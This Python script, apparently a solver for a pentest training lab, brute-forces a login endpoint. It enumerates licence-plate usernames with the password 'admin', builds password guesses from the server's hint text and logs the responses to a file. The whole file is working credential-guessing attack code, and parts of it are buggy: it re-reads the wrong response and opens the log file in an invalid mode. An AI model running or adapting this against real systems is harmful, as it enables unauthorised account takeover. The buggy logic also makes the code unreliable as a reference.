import requests
import json
from itertools import permutations

#url = "http://10.41.176.158:8000/login/authenticate"
url = "http://autoimmat.pentest101.net/login/authenticate"
flag2 = '{"flag": 2}'
#flag3 = '{"flag": 3}'
counter = 1


def postreq(username , password):
	data = {'plate':username,'password':password}
	r = requests.post(url,data=data)
	print(username)
	#print(r.content)
	return r.content


def brute(username , response):
	global counter

	if flag2 == response :
		print("Plate Test Number : " + str(counter))

	else :
		#if r.code == 500 :
		#	brute(username , password)

		print("--------------------------------------------------------------")
		dic = json.loads(response)
		hint = dic['hint']
		#print(hint.split())
		hint = hint.replace(',', '')
		hint = hint.replace('.', '')
		#hint = hint.replace('\n', ' ')
		#print(hint.split())

		


		passs = permutations(hint.split() , 2)
		for i in list(passs):
			#print(i)
			hintpass = ''.join(i)
			print(hintpass)
			check = postreq(username , hintpass)
			check = json.loads(response)
			print(check)
			# if check['flag'] == 4:
			# 	print("congraatttssssssss!!!!!!!!!!!!!!!!!!!!!!!!!!!")
			# 	print(hintpass)

		with open('plate.txt' , 'aw') as plates:
			plate = response
			plates.write(username)
			plates.write('\n')
			plates.write(plate)
			plates.write('\n')

		print(dic['flag'])
		
			
	counter = counter + 1



def loop_plates():

	for i in range(1000):
		pnum = 'AA-' + str( "{0:03}".format(i)) +'-AA'
		res = postreq(pnum , "admin")
		brute(pnum , res)
		
		for c4 in "ABCDEFGHIJKLMNOPQRSTUVWXYZ":
			pnum = 'AA-' + str( "{0:03}".format(i)) + '-A' + c4
			res = postreq(pnum , "admin")
			brute(pnum , res)

			for c3 in "ABCDEFGHIJKLMNOPQRSTUVWXYZ":
				pnum = 'AA-' + str( "{0:03}".format(i)) + '-' + c3 + c4
				res = postreq(pnum , "admin")
				brute(pnum , res)

				for c2 in "ABCDEFGHIJKLMNOPQRSTUVWXYZ":
					pnum = 'A' + c2 + '-' + str( "{0:03}".format(i)) + '-' + c3 + c4
					res = postreq(pnum , "admin")
					brute(pnum , res)
					
					for c1 in "ABCD":
						pnum = c1 + c2 + '-' + str( "{0:03}".format(i)) + '-' + c3 + c4
						res = postreq(pnum , "admin")
						brute(pnum , res)



def main():
	# test = postreq("DW-000-CA" , "admin")
	# brute("DW-000-CA" , test)
	loop_plates()


if __name__ == '__main__':
	main()